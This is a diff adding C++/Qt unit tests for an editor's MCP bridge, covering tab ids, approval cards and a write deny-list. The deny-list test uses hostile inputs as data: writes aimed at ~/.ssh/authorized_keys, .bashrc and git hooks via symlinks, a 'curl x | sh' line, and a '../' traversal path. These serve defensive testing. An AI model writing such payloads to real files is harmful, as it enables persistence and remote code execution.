@@ -741,6 +741,38 @@ private:
         return resp;
     }
 
+    // ── v0.1.133 helpers ──
+    qint64 tabIdAt(QLocalSocket &s, int idx) {
+        const QJsonArray tabs = call(s, 9000, QStringLiteral("list_open_tabs"))
+                                    .value(QLatin1String("result")).toObject()
+                                    .value(QLatin1String("tabs")).toArray();
+        return qint64(tabs.at(idx).toObject().value(QLatin1String("id")).toDouble(-1));
+    }
+    // Click Approve/Deny on the live card; false when no card appeared.
+    bool clickCard(bool approve) {
+        QFrame *card = waitForCard();
+        if (!card) return false;
+        auto *b = card->findChild<QPushButton *>(
+            approve ? QStringLiteral("mcpApproveBtn") : QStringLiteral("mcpDenyBtn"));
+        if (!b) return false;
+        b->click();
+        return true;
+    }
+    QString cardText() {
+        QFrame *card = waitForCard();
+        if (!card) return QString();
+        auto *d = card->findChild<QLabel *>(QStringLiteral("mcpApprovalDesc"));
+        return d ? d->text() : QString();
+    }
+    // A request that must be refused BEFORE any card is shown.
+    QJsonObject callNoCard(QLocalSocket &s, int id, const QString &verb,
+                           const QJsonObject &args) {
+        const QJsonObject r = call(s, id, verb, args);
+        if (findCard()) QTest::qFail("a card was shown for a refused request",
+                                     __FILE__, __LINE__);
+        return r;
+    }
+
 private slots:
     void init() {
         // Crash-localizer: on offscreen-Windows CI a hard access violation
@@ -2999,7 +3031,7 @@ private slots:
         QCOMPARE(r.value(QLatin1String("ok")).toBool(), false);
         QVERIFY(r.value(QLatin1String("error"))
                     .toString()
-                    .contains(QLatin1String("missing source or tab_index")));
+                    .contains(QLatin1String("missing source, tab_id or tab_index")));
     }
 
     void run_sql_select_and_engine() {
@@ -3308,7 +3340,7 @@ private slots:
         auto *desc =
             card->findChild<QLabel *>(QStringLiteral("mcpApprovalDesc"));
         QVERIFY(desc);
-        QVERIFY(desc->text().contains(QLatin1String("export 'd.npd' to")));
+        QVERIFY(desc->text().contains(QLatin1String("export 'd.npd' as PNG to")));
         card->findChild<QPushButton *>(QStringLiteral("mcpApproveBtn"))->click();
         const QJsonObject r = readObj(s);
         QVERIFY(r.value(QLatin1String("ok")).toBool());
@@ -3465,7 +3497,7 @@ private slots:
         r = call(s, 313, QStringLiteral("get_diagram_source"));
         QCOMPARE(r.value(QLatin1String("ok")).toBool(), false);
         QVERIFY(r.value(QLatin1String("error")).toString()
-                    .contains(QLatin1String("missing tab_index")));
+                    .contains(QLatin1String("missing tab_id, tab_index")));
     }
 
     void set_diagram_source_approve_deny_and_validation() {
@@ -4243,6 +4275,305 @@ private slots:
         QVERIFY2(call(s, 104, QStringLiteral("select_range"), okRange)
                      .value(QLatin1String("ok")).toBool(),
                  "guard: select_range must still work on a normal tab");
+    }
+
+    // ── v0.1.133 · Phase 1 contract defects ───────────────────────────
+
+    // D2: the diagram verbs advertised tab_id but required tab_index.
+    void v0133_diagram_verbs_accept_tab_id() {
+        m_fakeTabs.append({QStringLiteral("d.npd"), QString(),
+                           QStringLiteral("node a (Start)\n"), false,
+                           QStringLiteral("Plain Text"), true});
+        const int di = m_fakeTabs.size() - 1;
+        QLocalSocket s;
+        QVERIFY(connectClient(s));
+        readGreeting(s);
+        const qint64 tid = tabIdAt(s, di);
+        QVERIFY(tid > 0);
+        QJsonObject byId;
+        byId[QStringLiteral("tab_id")] = tid;
+        QJsonObject r = call(s, 1, QStringLiteral("get_diagram_source"), byId);
+        QVERIFY2(r.value(QLatin1String("ok")).toBool(),
+                 qPrintable(r.value(QLatin1String("error")).toString()));
+        r = call(s, 2, QStringLiteral("validate_npd"), byId);
+        QVERIFY(r.value(QLatin1String("ok")).toBool());
+        QJsonObject set = byId;
+        set[QStringLiteral("source")] = QStringLiteral("node b (B)\n");
+        sendRequest(s, 3, QStringLiteral("set_diagram_source"), set);
+        QVERIFY(clickCard(true));
+        r = readObj(s);
+        QVERIFY(r.value(QLatin1String("ok")).toBool());
+        QCOMPARE(m_fakeTabs[di].text, QStringLiteral("node b (B)\n"));
+        QVERIFY(waitForCardGone());
+        QTemporaryDir dir;
+        QJsonObject ex = byId;
+        ex[QStringLiteral("path")] = dir.path() + QStringLiteral("/o.png");
+        ex[QStringLiteral("format")] = QStringLiteral("png");
+        sendRequest(s, 4, QStringLiteral("export_diagram"), ex);
+        QVERIFY(clickCard(true));
+        QVERIFY(readObj(s).value(QLatin1String("ok")).toBool());
+        QVERIFY(waitForCardGone());
+        // A stale id is an error on every one of them.
+        QJsonObject stale;
+        stale[QStringLiteral("tab_id")] = 999999;
+        for (const char *v : {"get_diagram_source", "validate_npd"}) {
+            r = call(s, 5, QLatin1String(v), stale);
+            QCOMPARE(r.value(QLatin1String("ok")).toBool(), false);
+            QVERIFY(r.value(QLatin1String("error")).toString()
+                        .contains(QLatin1String("was closed")));
+        }
+    }
+
+    // D3: goto_line / set_language ignored tab_id and acted on the focused
+    // tab. A stale id must be an ERROR, never a fallback.
+    void v0133_stale_tab_id_is_an_error_never_the_focused_tab() {
+        QLocalSocket s;
+        QVERIFY(connectClient(s));
+        readGreeting(s);
+        const qint64 t1 = tabIdAt(s, 1);
+        m_currentIndex = 0;
+        QJsonObject g;
+        g[QStringLiteral("line")] = 2;
+        g[QStringLiteral("tab_id")] = t1;
+        QJsonObject r = call(s, 1, QStringLiteral("goto_line"), g);
+        QVERIFY(r.value(QLatin1String("ok")).toBool());
+        QCOMPARE(m_currentIndex, 1); // landed in the NAMED tab
+        QCOMPARE(r.value(QLatin1String("result")).toObject()
+                     .value(QLatin1String("tab_index")).toInt(), 1);
+        m_currentIndex = 0;
+        m_lastGotoLine = -1;
+        g[QStringLiteral("tab_id")] = 999999;
+        r = call(s, 2, QStringLiteral("goto_line"), g);
+        QCOMPARE(r.value(QLatin1String("ok")).toBool(), false);
+        QCOMPARE(m_lastGotoLine, -1); // nothing moved anywhere
+        QJsonObject l;
+        l[QStringLiteral("language")] = QStringLiteral("Python");
+        l[QStringLiteral("tab_id")] = 999999;
+        r = call(s, 3, QStringLiteral("set_language"), l);
+        QCOMPARE(r.value(QLatin1String("ok")).toBool(), false);
+        QCOMPARE(m_fakeTabs[0].language, QStringLiteral("Plain Text"));
+        l[QStringLiteral("tab_id")] = t1;
+        QVERIFY(call(s, 4, QStringLiteral("set_language"), l)
+                    .value(QLatin1String("ok")).toBool());
+        QCOMPARE(m_fakeTabs[1].language, QStringLiteral("Python"));
+        QCOMPARE(m_fakeTabs[0].language, QStringLiteral("Plain Text"));
+        // compare_tabs by id; a stale id names the problem.
+        QJsonObject c;
+        c[QStringLiteral("tab_id_a")] = tabIdAt(s, 0);
+        c[QStringLiteral("tab_id_b")] = t1;
+        QVERIFY(call(s, 5, QStringLiteral("compare_tabs"), c)
+                    .value(QLatin1String("ok")).toBool());
+        c[QStringLiteral("tab_id_b")] = 999999;
+        r = call(s, 6, QStringLiteral("compare_tabs"), c);
+        QCOMPARE(r.value(QLatin1String("ok")).toBool(), false);
+        QVERIFY(r.value(QLatin1String("error")).toString()
+                    .contains(QLatin1String("was closed")));
+        QCOMPARE(m_compareCount, 1);
+    }
+
+    // D4: a held write names the DOCUMENT on the card, not a position.
+    void v0133_held_write_follows_the_document_not_the_index() {
+        QLocalSocket s;
+        QVERIFY(connectClient(s));
+        readGreeting(s);
+        tabIdAt(s, 0); // stamp ids
+        QJsonObject a;
+        a[QStringLiteral("tab_index")] = 1;
+        a[QStringLiteral("text")] = QStringLiteral("XYZ");
+        sendRequest(s, 1, QStringLiteral("insert_text"), a);
+        QVERIFY(waitForCard());
+        const QString before0 = m_fakeTabs[0].text;
+        m_fakeTabs.removeAt(0); // tab 1 is now at index 0
+        QVERIFY(clickCard(true));
+        QJsonObject r = readObj(s);
+        QVERIFY2(r.value(QLatin1String("ok")).toBool(),
+                 qPrintable(r.value(QLatin1String("error")).toString()));
+        QCOMPARE(r.value(QLatin1String("result")).toObject()
+                     .value(QLatin1String("tab_index")).toInt(), 0);
+        QVERIFY(m_fakeTabs[0].text.contains(QLatin1String("XYZ")));
+        QVERIFY(m_fakeTabs[0].title == QStringLiteral("Untitled 1"));
+        QVERIFY(!before0.contains(QLatin1String("XYZ")));
+        QVERIFY(waitForCardGone());
+
+        // Target closed during the wait: the write fails, nothing else moves.
+        m_fakeTabs.append({QStringLiteral("other.txt"), QStringLiteral("/fake/o.txt"),
+                           QStringLiteral("o\n"), false});
+        tabIdAt(s, 1);
+        a[QStringLiteral("tab_index")] = 0;
+        sendRequest(s, 2, QStringLiteral("insert_text"), a);
+        QVERIFY(waitForCard());
+        m_fakeTabs.removeAt(0);
+        QVERIFY(clickCard(true));
+        r = readObj(s);
+        QCOMPARE(r.value(QLatin1String("ok")).toBool(), false);
+        QVERIFY(r.value(QLatin1String("error")).toString()
+                    .contains(QLatin1String("was closed")));
+        QCOMPARE(m_fakeTabs[0].text, QStringLiteral("o\n"));
+        QVERIFY(waitForCardGone());
+
+        // apply_edit: the document changed so the card's match is ambiguous.
+        m_fakeTabs[0].text = QStringLiteral("abc needle\n");
+        QJsonObject e;
+        e[QStringLiteral("tab_index")] = 0;
+        e[QStringLiteral("find")] = QStringLiteral("needle");
+        e[QStringLiteral("replace")] = QStringLiteral("pin");
+        sendRequest(s, 3, QStringLiteral("apply_edit"), e);
+        QVERIFY(waitForCard());
+        m_fakeTabs[0].text = QStringLiteral("needle abc needle\n");
+        QVERIFY(clickCard(true));
+        r = readObj(s);
+        QCOMPARE(r.value(QLatin1String("ok")).toBool(), false);
+        QVERIFY(r.value(QLatin1String("error")).toString()
+                    .contains(QLatin1String("document changed")));
+        QCOMPARE(m_fakeTabs[0].text, QStringLiteral("needle abc needle\n"));
+    }
+
+    // D12: write destinations go through the deny-list before any card.
+    void v0133_write_destination_denylist() {
+        QTemporaryDir dir;
+        QVERIFY(dir.isValid());
+        const QString root = dir.path();
+        QVERIFY(QDir().mkpath(root + QStringLiteral("/repo/.git/hooks")));
+        QVERIFY(QFile::link(root + QStringLiteral("/repo/.git/hooks"),
+                            root + QStringLiteral("/hooklink")));
+        QVERIFY(QFile::link(root + QStringLiteral("/repo/.git/hooks/post-checkout"),
+                            root + QStringLiteral("/innocent.txt")));
+        QLocalSocket s;
+        QVERIFY(connectClient(s));
+        readGreeting(s);
+        const QStringList bad = {
+            QDir::homePath() + QStringLiteral("/.ssh/authorized_keys"),
+            root + QStringLiteral("/.bashrc"),
+            root + QStringLiteral("/repo/.git/hooks/pre-commit"),
+            root + QStringLiteral("/hooklink/pre-commit"), // symlinked parent
+            root + QStringLiteral("/innocent.txt"),        // dangling leaf link
+        };
+        int rid = 10;
+        for (const QString &p : bad) {
+            if (!QDir(QFileInfo(p).absolutePath()).exists()) continue;
+            QJsonObject a;
+            a[QStringLiteral("tab_index")] = 0;
+            a[QStringLiteral("path")] = p;
+            const QJsonObject r = callNoCard(s, ++rid, QStringLiteral("save_tab"), a);
+            QVERIFY2(!r.value(QLatin1String("ok")).toBool(), qPrintable(p));
+            QVERIFY2(r.value(QLatin1String("error")).toString()
+                         .contains(QLatin1String("refusing to write")),
+                     qPrintable(p));
+        }
+        // An already-open protected file refuses every buffer write verb.
+        m_fakeTabs.append({QStringLiteral(".bashrc"), root + QStringLiteral("/.bashrc"),
+                           QStringLiteral("alias ll='ls -l'\n"), false});
+        const int bi = m_fakeTabs.size() - 1;
+        QJsonObject ins;
+        ins[QStringLiteral("tab_index")] = bi;
+        ins[QStringLiteral("text")] = QStringLiteral("curl x | sh\n");
+        QJsonObject r = callNoCard(s, 30, QStringLiteral("insert_text"), ins);
+        QVERIFY(r.value(QLatin1String("error")).toString()
+                    .contains(QLatin1String("refusing to write")));
+        QJsonObject ed;
+        ed[QStringLiteral("tab_index")] = bi;
+        ed[QStringLiteral("find")] = QStringLiteral("ll");
+        ed[QStringLiteral("replace")] = QStringLiteral("x");
+        r = callNoCard(s, 31, QStringLiteral("apply_edit"), ed);
+        QCOMPARE(r.value(QLatin1String("ok")).toBool(), false);
+        QCOMPARE(m_fakeTabs[bi].text, QStringLiteral("alias ll='ls -l'\n"));
+        // Vacuity guard: an ordinary destination still reaches a card.
+        QJsonObject ok;
+        ok[QStringLiteral("tab_index")] = 0;
+        ok[QStringLiteral("path")] = root + QStringLiteral("/fine.txt");
+        sendRequest(s, 40, QStringLiteral("save_tab"), ok);
+        QVERIFY(clickCard(false));
+        QCOMPARE(readObj(s).value(QLatin1String("error")).toString(),
+                 QStringLiteral("denied by user"));
+    }
+
+    // D9: every verb that creates or reports a tab returns its stable id.
+    void v0133_results_carry_tab_id() {
+        QTemporaryDir dir;
+        const QString f = dir.path() + QStringLiteral("/a.txt");
+        QFile file(f);
+        QVERIFY(file.open(QIODevice::WriteOnly));
+        file.write("x\n");
+        file.close();
+        QLocalSocket s;
+        QVERIFY(connectClient(s));
+        readGreeting(s);
+        QJsonObject o;
+        o[QStringLiteral("path")] = f;
+        const QStringList verbs = {QStringLiteral("open_file"), QStringLiteral("new_tab"),
+                                   QStringLiteral("create_diagram"),
+                                   QStringLiteral("get_status")};
+        int rid = 0;
+        for (const QString &v : verbs) {
+            const QJsonObject r =
+                call(s, ++rid, v, v == QLatin1String("open_file") ? o : QJsonObject());
+            QVERIFY2(r.value(QLatin1String("ok")).toBool(), qPrintable(v));
+            const QJsonObject res = r.value(QLatin1String("result")).toObject();
+            QVERIFY2(res.value(QLatin1String("tab_id")).toDouble(-1) > 0, qPrintable(v));
+        }
+    }
+
+    // D16: the card shows the time left and keeps counting.
+    void v0133_card_shows_a_live_countdown() {
+        m_bridge->setApprovalTimeoutMs(65000);
+        QLocalSocket s;
+        QVERIFY(connectClient(s));
+        readGreeting(s);
+        QJsonObject a;
+        a[QStringLiteral("text")] = QStringLiteral("x");
+        sendRequest(s, 1, QStringLiteral("insert_text"), a);
+        QFrame *card = waitForCard();
+        QVERIFY(card);
+        auto *cd = card->findChild<QLabel *>(QStringLiteral("mcpApprovalCountdown"));
+        QVERIFY(cd);
+        const QString first = cd->text();
+        QVERIFY2(first == QStringLiteral("Auto-deny in 1:05") ||
+                     first == QStringLiteral("Auto-deny in 1:04"),
+                 qPrintable(first));
+        QTRY_VERIFY_WITH_TIMEOUT(cd->text() != first, 3000);
+        QVERIFY(clickCard(false));
+        QCOMPARE(readObj(s).value(QLatin1String("error")).toString(),
+                 QStringLiteral("denied by user"));
+    }
+
+    // D7b: a relative note path resolves against the Noter root, confined.
+    void v0133_read_note_relative_path() {
+        QTemporaryDir dir;
+        const QString root = dir.path() + QStringLiteral("/Noter");
+        writeNote(root + QStringLiteral("/Inbox/a.html"), QStringLiteral("A"),
+                  QStringLiteral("body-a"));
+        writeNote(dir.path() + QStringLiteral("/outside.html"), QStringLiteral("O"),
+                  QStringLiteral("secret"));
+        m_notesRoot = root;
+        QLocalSocket s;
+        QVERIFY(connectClient(s));
+        readGreeting(s);
+        QJsonObject a;
+        a[QStringLiteral("file")] = QStringLiteral("Inbox/a.html");
+        QJsonObject r = call(s, 1, QStringLiteral("read_note"), a);
+        QVERIFY2(r.value(QLatin1String("ok")).toBool(),
+                 qPrintable(r.value(QLatin1String("error")).toString()));
+        QVERIFY(r.value(QLatin1String("result")).toObject()
+                    .value(QLatin1String("text")).toString().contains(QLatin1String("body-a")));
+        a[QStringLiteral("file")] = QStringLiteral("../outside.html");
+        r = call(s, 2, QStringLiteral("read_note"), a);
+        QCOMPARE(r.value(QLatin1String("ok")).toBool(), false);
+        QVERIFY(r.value(QLatin1String("error")).toString()
+                    .contains(QLatin1String("inside the Noter folder")));
+    }
+
+    // D6: quitting the event loop takes the endpoint file down even when the
+    // bridge itself is never destroyed (the SIGTERM -> quit() path).
+    void v0133_endpoint_unpublished_on_about_to_quit() {
+        QTemporaryDir dir;
+        auto *b = new McpBridge(makeHost(), this, m_name + QStringLiteral("-quit"),
+                                dir.path());
+        const QString path = dir.path() + QStringLiteral("/mcp-endpoint.json");
+        QVERIFY(QFileInfo::exists(path));
+        QVERIFY(QMetaObject::invokeMethod(qApp, "aboutToQuit",
+                                          Qt::DirectConnection));
+        QVERIFY(!QFileInfo::exists(path));
+        delete b;
     }
 
     void endpoint_file_is_published() {
